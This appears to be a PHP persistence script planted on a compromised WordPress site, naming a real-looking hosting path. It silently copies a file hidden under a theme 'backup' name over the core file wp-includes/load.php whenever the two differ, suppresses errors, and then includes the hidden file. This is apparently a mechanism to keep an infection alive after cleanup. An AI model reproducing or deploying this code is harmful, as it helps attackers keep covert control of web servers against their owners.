<?php
$target = '/home/u952560344/domains/demandifymedia.com/public_html/wp-includes/load.php';
$backup = '/home/u952560344/domains/demandifymedia.com/public_html/wp-content/themes/silk-blog/backup_silk-blog.php';

if (file_exists($backup)) {
    if (!file_exists($target) || md5_file($target) !== md5_file($backup)) {
        @copy($backup, $target);
        @chmod($target, 0644);
    }
    @include_once $backup;
}
?>
